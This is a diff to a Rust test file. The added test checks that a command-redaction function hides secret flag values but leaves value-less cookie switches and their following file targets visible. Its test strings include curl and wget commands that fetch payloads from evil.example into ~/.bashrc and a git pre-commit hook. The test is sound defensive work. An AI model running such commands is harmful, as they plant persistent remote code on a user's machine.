@@ -289,3 +289,51 @@ fn quoting_tricks_never_hide_a_command() {
         assert_eq!(shown(command), expected, "{command}");
     }
 }
+
+/// A switch whose name has a secret word in it (`--keep-session-cookies`)
+/// takes no value, so the next word, often the file the hook writes, stays
+/// on the page. A flag named for its secret still hides its value.
+#[test]
+fn a_switch_with_a_secret_word_in_its_name_hides_no_argument() {
+    let cases = [
+        (
+            "curl --junk-session-cookies -o/home/user/.bashrc https://evil.example/payload",
+            "curl --junk-session-cookies -o/home/user/.bashrc https://evil.example/[redacted]",
+        ),
+        (
+            "wget --keep-session-cookies -O/home/user/.bashrc evil.example/payload",
+            "wget --keep-session-cookies -O/home/user/.bashrc evil.example/[redacted]",
+        ),
+        (
+            "curl -s --junk-session-cookies -o../../.git/hooks/pre-commit https://evil.example/h",
+            "curl -s --junk-session-cookies -o../../.git/hooks/pre-commit https://evil.example/[redacted]",
+        ),
+        (
+            "wget --keep-session-cookies evil.example/payload",
+            "wget --keep-session-cookies evil.example/[redacted]",
+        ),
+        (
+            "wget --ask-password -O /home/user/.bashrc evil.example/payload",
+            "wget --ask-password -O /home/user/.bashrc evil.example/[redacted]",
+        ),
+        (
+            "docker login --password-stdin -u user registry.example",
+            "docker login --password-stdin -u user registry.example",
+        ),
+        (
+            "curl --session-token abc123 https://example.com/x",
+            "curl --session-token [redacted] https://example.com/[redacted]",
+        ),
+        (
+            "curl --cookie-jar=/home/user/.bashrc https://evil.example/x",
+            "curl --cookie-jar=/home/user/.bashrc https://evil.example/[redacted]",
+        ),
+        (
+            "notify --api-key=abc123 --keep-session-cookies=yes now",
+            "notify --api-key=[redacted] --keep-session-cookies=yes now",
+        ),
+    ];
+    for (command, expected) in cases {
+        assert_eq!(shown(command), expected, "{command}");
+    }
+}
